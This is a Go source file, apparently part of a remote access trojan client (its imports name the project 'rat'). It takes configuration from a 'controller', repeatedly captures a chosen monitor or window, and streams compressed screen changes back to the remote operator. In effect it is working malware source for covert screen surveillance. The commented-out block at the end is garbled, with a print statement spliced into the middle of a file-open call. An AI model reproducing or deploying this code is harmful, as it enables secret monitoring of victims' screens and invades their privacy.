package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"image"
	"io"
	"rat/client/screen"
	"rat/imgdiff"

	"github.com/disintegration/imaging"
	"github.com/pierrec/lz4"
)

type ScreenChannel struct {
	Active bool
	Scale  float32

	// monitor or window
	Monitor bool

	// monitor/window handle
	Handle int32
}

// reset reads new config from controller
func (sc *ScreenChannel) reset(channel io.Reader) (err error) {
	binary.Read(channel, binary.LittleEndian, &sc.Monitor)
	binary.Read(channel, binary.LittleEndian, &sc.Scale)
	err = binary.Read(channel, binary.LittleEndian, &sc.Handle)

	return
}

func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
	defer channel.Close()
	var err error

	err = sc.reset(channel)

	go func() {
		for {
			err = sc.reset(channel)
			if err != nil {
				channel.Close()
				return
			}
		}
	}()

	cmp := imgdiff.NewComparer(6, 6)

	go func() {
		for {
			select {
			case <-c.die:
				return
			case chunk := <-cmp.C:
				rect := chunk.Rect

				x := int32(float32(rect.Min.X) * sc.Scale)
				y := int32(float32(rect.Min.Y) * sc.Scale)
				x1 := int32(float32(rect.Max.X) * sc.Scale)
				y1 := int32(float32(rect.Max.Y) * sc.Scale)

				if sc.Scale > 0 && sc.Scale < 1.0 {
					width := int(float32(chunk.Rect.Dx()) * sc.Scale)
					height := int(float32(chunk.Rect.Dy()) * sc.Scale)

					nrgba := imaging.Resize(chunk, width, height, imaging.NearestNeighbor)
					chunk = &image.RGBA{
						Pix:    nrgba.Pix,
						Stride: nrgba.Stride,
						Rect:   nrgba.Rect,
					}
				}

				binary.Write(channel, binary.LittleEndian, x)
				binary.Write(channel, binary.LittleEndian, y)
				binary.Write(channel, binary.LittleEndian, x1)
				binary.Write(channel, binary.LittleEndian, y1)

				var imgdata bytes.Buffer
				ll := lz4.NewWriter(&imgdata)
				imgdiff.Write(ll, chunk)
				ll.Flush()
				ll.Close()


				binary.Write(channel, binary.LittleEndian, int32(imgdata.Len()))
				_, err = channel.Write(imgdata.Bytes())

				if err != nil {
					return
				}
			}
		}
	}()

	for err == nil {
		var capture image.Image
		if sc.Monitor {
			capture = screen.Capture(screen.Monitors[sc.Handle])
		} else {
			capture = screen.CaptureWindow(int(sc.Handle))
		}

		cmp.Update(capture.(*image.RGBA))

		select {
		case <-c.die:
			return nil
		default:
		}
	}

	return err
}

/* func (packet *SendScreenPacket) Init() {
	screen.QueryMonitors()

	var w bytes.Buffer

	var img image.Image
	if true {
		// Read image from file that already exists
		existingImageFile, err := os.	fmt.Println("channel open")
Open("mock_scrot.png")
		if err != nil {
			// Handle error
		}
		defer existingImageFile.Close()

		// Calling the generic image.Decode() will tell give us the data
		// and type of image it is as a string. We expect "png"
		img, _, _ = image.Decode(existingImageFile)
	} else if monitor {
		if handle >= len(screen.Monitors) {
			handle = 0
		}

		img = screen.Capture(screen.Monitors[handle])
	} else {
		img = screen.CaptureWindow(handle)
	}

	if img == nil {
		return
	}

	if scale > 0 && scale < 1.0 {
		width := float32(img.Bounds().Max.X) * scale
		height := float32(img.Bounds().Max.Y) * scale

		img = imaging.Resize(img, int(width), int(height), imaging.NearestNeighbor)
	}

	jpeg.Encode(&w, img, &jpeg.Options{
		Quality: 75,
	})

	packet.Buffer = w.Bytes()
	packet.Width = img.Bounds().Max.X
	packet.Height = img.Bounds().Max.Y

	// Send another screen packet if we're still streaming
	if screenStream {
		go func() {
			Queue <- packet
		}()
	}
}
*/
